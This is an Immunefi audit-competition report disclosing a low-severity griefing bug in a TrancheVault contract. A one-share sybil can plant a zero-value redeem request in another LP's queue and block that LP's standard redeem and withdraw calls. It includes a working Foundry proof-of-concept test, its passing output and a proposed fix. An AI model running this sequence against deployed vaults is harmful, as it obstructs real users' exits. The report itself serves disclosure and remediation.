# \#98171 [SC-Low] Anyone can plant a 1-share "dust" redeem in another LP's queue and block that LP's standard `redeem`/`withdraw` until the LP cleans it up

**Submitted on Nov 5th 2026 at 18:03:55 UTC by @Web3Vinay for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98171
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

### Brief/Intro

`requestRedeem(shares, controller, owner)` lets the share owner pick **any** address as `controller`. No consent from that address is needed. The request is appended to the **controller's** redeem queue. The standard ERC-7540 exits (`redeem`, `withdraw`, `maxRedeem`, `maxWithdraw`) only look at the **head** of that queue.

So an attacker with 1 share can put a worthless request at the head of a victim's queue. It is priced at 0 assets and becomes a refund epoch. From then on, the victim's own funded request sits behind it, and the standard `redeem`/`withdraw` return 0 or revert.

In short:

| Step | What happens |
|---|---|
| 1 | Attacker sybil holds exactly 1 share and calls `requestRedeem(1, victim, sybil)` |
| 2 | The 1-share request is priced at 0 USDG, so its epoch becomes refundable and stays at the victim's queue head |
| 3 | Victim requests a real redemption. It is fully funded but sits behind the dust node |
| 4 | Victim's `redeem`/`withdraw`/`maxRedeem` return 0 or revert |
| 5 | Victim must call `claimRedeem(id, ...)`, cancel the dust before its epoch starts, or `claimRedeemRefund`. The refund claim also resets the victim's wallet-wide 1h cooldown (`:943`) |

### Vulnerability Details

```solidity
// TrancheVault.sol:606-632 -- no check that msg.sender is allowed to act for `controller`
function requestRedeem(uint256 shares, address controller, address owner) external returns (uint256 requestId) {
    ...
    _requireMinimumRedeemSize(shares, maxShares);            // passes: shares == maxShares (full balance, :1611-1618)
    ...
@>  requestId = _enqueueRedeemRequest(shares, controller);   // appended to the VICTIM's list
}

// TrancheVault.sol:1783-1795
function _appendControllerRedeem(address controller, uint256 requestId) internal {
    ...
    if (tail == 0) {
@>      controllerRedeemHead[controller] = requestId;        // dust node becomes the head
    } else { ... }
}

// TrancheVault.sol:1006-1012, 1306-1311 -- standard claims only look at the head
function redeem(uint256 shares, address receiver, address controller) public override returns (uint256 assets) {
@>  return _claimRedeem(controllerRedeemHead[controller], shares, receiver, controller);
}
function maxRedeem(address controller) public view override returns (uint256) {
@>  uint256 requestId = controllerRedeemHead[controller];
    return requestId == 0 ? 0 : claimableRedeemRequest(requestId, controller);
}
```

- The 1-share request passes the minimum size check because a full-balance redeem is exempt (`_requireMinimumRedeemSize`, `:1611-1618`, documented in `SECURITY.md` L1409-1410). The attacker therefore needs a sybil that holds **exactly** 1 share.
- The dust node is only the head if it is queued **before** the victim's own request, or while the victim's list is empty. A dust node queued behind the victim's request does nothing (negative test below).
- The refund epoch cannot be cleared by anyone but the controller or its operator (`claimRedeemRefund`, `:916`, `_requireControllerAuth` `:1603`).
- Cleaning the head via `claimRedeemRefund` sets `lastDepositTime[receiver] = block.timestamp` (`:943`), which blocks `requestRedeem` and share transfers for the victim's whole wallet for 1 hour.

### Impact Details

- **Funds at risk: 0.** In the PoC the victim receives its full `49,999.997924 USDG` through `claimRedeem(requestId, ...)` while the dust node is still at the head.
- What the victim loses is the standard ERC-7540 path. An integrator or aggregator that only calls `redeem/withdraw/maxRedeem` is stuck until it cleans the head (`claimRedeemRefund`, or `cancelRedeemRequest` before the dust epoch starts, i.e. within 1 hour).
- The 1h wallet cooldown is not forced. It only happens if the victim itself calls `claimRedeemRefund`. The explicit-id claim leaves the cooldown untouched (asserted in the PoC).
- Attacker cost: 1 share, worth `0` USDG (`estimateRedeemAssets(1) == 0`), plus 2 transactions. The dust share is refunded to the **victim**, not to the attacker. The attacker can plant again with a new 1-share sybil whenever the victim's list is empty.

### Why this is not a known issue, and not a Sybil attack

- **MED-24 / MED-29 (listed as known):** zero-payout epochs consume the global 16-epoch settlement budget, and rounding costs tiny redeemers value. Here the victim is one specific controller's queue and the attacker names the victim as controller. Neither item describes that.
- **`SECURITY.md` "Known Limitations" (`:1401-1415`, "LP claim and allocation limitations"):** it documents that a dust-sized request can floor to zero entitlement, that a full-balance redemption bypasses the minimum size, and that zero-payout epochs can delay later epochs. It does not say that a third party can use these to put a request into **another controller's** queue and block that controller's standard claims.
- **LOW-39 / LOW-40 (fixed with `receiver == controller`):** the program says a report on the same root cause is valid if the fix at `a82d4fef` is incomplete. That fix controls who **receives** shares. It does not control who may **create** a request in another account's queue (`requestRedeem`, `:606-632`, only checks the `owner` side). The cooldown reset at `:943` is the same side effect LOW-40 wanted to prevent, reachable through a path the fix did not cover.
- **`IAsyncTrancheVault.sol:8-10`:** documents that a refundable head must be cancelled or reclaimed before standard claims advance, and that explicit-id methods exist. It does not say that a third party can create that head for an unrelated controller, so this is not a "consciously decided" behaviour for the third-party case.
- **Sybil exclusion:** the attacker does not gain anything from many identities or from voting/weight multiplication. The only extra address is a holder of exactly 1 share, needed because a full-balance request is exempt from the minimum size (`:1611-1618`). The bug is the missing consent check on `controller`; the number of attacker addresses is not what creates the impact (any address that happens to hold exactly 1 share can plant the node).

### Mitigation

Require consent when `controller != owner`:

```solidity
if (controller != owner && msg.sender != controller && !isOperator[controller][msg.sender]) {
    revert TrancheVault__NotControllerOrOperator();
}
```

Alternatively, let anyone clear a zero-payout refund head without touching the controller's cooldown.

### References

- `packages/perps/src/TrancheVault.sol:606-632`: `requestRedeem` (no controller consent)
- `packages/perps/src/TrancheVault.sol:688-710`, `:1783-1795`: `_enqueueRedeemRequest`, `_appendControllerRedeem` (head set at `:1791`)
- `packages/perps/src/TrancheVault.sol:1611-1618`: min-size exemption for full-balance redeems
- `packages/perps/src/TrancheVault.sol:998-1012`, `:1299-1311`: head-only `withdraw`, `redeem`, `maxWithdraw`, `maxRedeem`
- `packages/perps/src/TrancheVault.sol:916-945`: `claimRedeemRefund` (cooldown reset at `:943`)
- `packages/perps/src/TrancheVault.sol:1014`: `claimRedeem(requestId, ...)` (explicit-id exit)
- `packages/perps/src/TrancheVault.sol:884-912`: `cancelRedeemRequest`
- `packages/perps/src/interfaces/IAsyncTrancheVault.sol:8-10`: head semantics

## Proof of Concept

## Proof of Concept


Save as `packages/perps/test/poc/DustRedeemHeadPoison.t.sol` and run:
`forge test --root packages/perps --match-path test/poc/DustRedeemHeadPoison.t.sol -vv`
It uses only the repo's `BasePerpTest` fixture. No in-scope contract is modified.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {console2} from "forge-std/console2.sol";

contract PoCDustRedeemHeadPoison is BasePerpTest {
    address internal constant VIC = address(0xA001); // victim LP / ERC-7540 integrator
    address internal constant ATK = address(0xBAD0); // attacker LP
    address internal constant SYB = address(0xBAD1); // attacker sybil, exactly 1 share
    TrancheVault internal v;

    function setUp() public override {
        super.setUp();
        vm.warp(Math.max(vm.getBlockTimestamp(), SETUP_TIMESTAMP + 7 days) + 1234);
        while (engine.isOracleFrozen()) vm.warp(vm.getBlockTimestamp() + 1 days);
        v = juniorVault;
        _fundTrancheAsync(v, VIC, 100_000e6);
        _fundTrancheAsync(v, ATK, 1_000e6);
        vm.warp(vm.getBlockTimestamp() + 2 hours); // clear 1h cooldown
    }

    function _settleAt(uint256 epochId) internal {
        vm.warp(v.depositEpochStart(epochId) + 1);
        uint256 p = engine.lastMarkPrice();
        vm.prank(address(router));
        engine.updateMarkPrice(p == 0 ? 1e8 : p, uint64(vm.getBlockTimestamp()));
        _settleLpEpochForTest();
    }

    function test_PoC_dustNodeBlocksVictimStandardRedeem() public {
        // 1. Attacker: sybil holds exactly 1 share and names the VICTIM as controller. No consent needed.
        vm.prank(ATK);
        v.transfer(SYB, 1);
        vm.prank(SYB);
        uint256 dustId = v.requestRedeem(1, VIC, SYB);
        _settleAt(dustId); // 1 share prices to 0 USDG -> refund epoch

        // 2. Victim makes a normal redeem request; it is funded in full.
        uint256 vShares = v.balanceOf(VIC) / 2;
        vm.prank(VIC);
        uint256 vid = v.requestRedeem(vShares, VIC, VIC);
        _settleAt(vid);
        assertEq(v.claimableRedeemRequest(vid, VIC), vShares, "victim request fully funded");

        // 3. Standard head-only exit is blocked by the attacker's dust node.
        assertEq(v.controllerRedeemHead(VIC), dustId, "dust node is the head");
        assertEq(v.maxRedeem(VIC), 0, "maxRedeem == 0");
        vm.prank(VIC);
        vm.expectRevert();
        v.redeem(vShares, VIC, VIC);

        // 4. Bound: funds are NOT lost; explicit-id claim pays in full and leaves the cooldown untouched.
        uint256 cd = v.lastDepositTime(VIC);
        uint256 before = settlementToken.balanceOf(VIC);
        vm.prank(VIC);
        v.claimRedeem(vid, vShares, VIC, VIC);
        console2.log("USDG paid via explicit id (6dp)", settlementToken.balanceOf(VIC) - before);
        assertEq(v.lastDepositTime(VIC), cd, "cooldown untouched by explicit-id claim");

        // 5. Cost of clearing the head the standard way: refund claim resets the victim's wallet cooldown (:943).
        vm.prank(VIC);
        v.claimRedeemRefund(dustId, VIC, VIC);
        assertEq(v.lastDepositTime(VIC), block.timestamp, "cooldown reset");
        uint256 q = v.balanceOf(VIC) / 10;
        vm.prank(VIC);
        vm.expectRevert(TrancheVault.TrancheVault__DepositCooldown.selector);
        v.requestRedeem(q, VIC, VIC);
        console2.log("attacker dust share value (6dp USDG)", v.estimateRedeemAssets(1));
    }

    // Negative: without the planted node the same victim exits normally through the standard path.
    function test_Negative_noDustStandardRedeemWorks() public {
        uint256 vShares = v.balanceOf(VIC) / 2;
        vm.prank(VIC);
        uint256 vid = v.requestRedeem(vShares, VIC, VIC);
        _settleAt(vid);
        assertEq(v.controllerRedeemHead(VIC), vid);
        uint256 m = v.maxRedeem(VIC);
        vm.prank(VIC);
        uint256 paid = v.redeem(m, VIC, VIC);
        assertGt(paid, 49_000e6);
    }
}
```

Result (actually run on the in-scope commit `a82d4fef`):

```
Ran 2 tests for test/poc/DustRedeemHeadPoison.t.sol:PoCDustRedeemHeadPoison
[PASS] test_Negative_noDustStandardRedeemWorks() (gas: 723794)
[PASS] test_PoC_dustNodeBlocksVictimStandardRedeem() (gas: 1298600)
Logs:
  USDG paid via explicit id (6dp) 49999997924
  attacker dust share value (6dp USDG) 0

Suite result: ok. 2 passed; 0 failed; 0 skipped
```

Extra cases covered in a longer local test file (all passed): a dust request queued **after** the victim's own request lands behind it and does not block; a sybil holding 2 shares cannot plant a 1-share request (`WithdrawalTooSmall`); the victim can `cancelRedeemRequest` the dust before its epoch starts; the attacker can re-plant after the victim cleans up.

